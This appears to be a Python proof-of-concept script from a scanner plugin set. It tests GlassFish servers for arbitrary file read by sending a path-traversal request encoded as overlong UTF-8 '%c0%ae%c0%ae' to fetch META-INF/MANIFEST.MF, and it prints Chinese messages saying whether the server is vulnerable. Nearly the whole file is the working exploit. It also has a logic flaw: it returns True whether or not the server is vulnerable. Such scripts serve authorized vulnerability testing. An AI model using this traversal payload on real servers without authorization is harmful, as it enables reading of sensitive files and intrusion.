#!/usr/bin/env python3

'''
name: Glassfish文件任意读取漏洞
description: Glassfish文件任意读取漏洞
'''

import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

class Glassfish_File_Read_BaseVerify:
    def __init__(self, url):
       self.url = url
       self.headers = {
            "User-Agent":"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)"
       }

    def run(self):
        url = self.url + '/theme/META-INF/%c0%ae%c0%ae/META-INF/MANIFEST.MF'
        try:
            req = requests.get(url, headers = self.headers, allow_redirects = False, verify=False)
            if 'Version' in req.text:
                result = "exits the Glassfish arbitrary file read vuln"
                print('存在Glassfish文件任意读取漏洞')
                return True
            else:
                print('不存在Glassfish文件任意读取漏洞')
                return True
        except Exception as e:
            print('不存在Glassfish文件任意读取漏洞')
            return False
        finally:
            pass

if __name__ == '__main__':
    Glassfish_File_Read = Glassfish_File_Read_BaseVerify('https://192.168.30.242:4848')
    Glassfish_File_Read.run()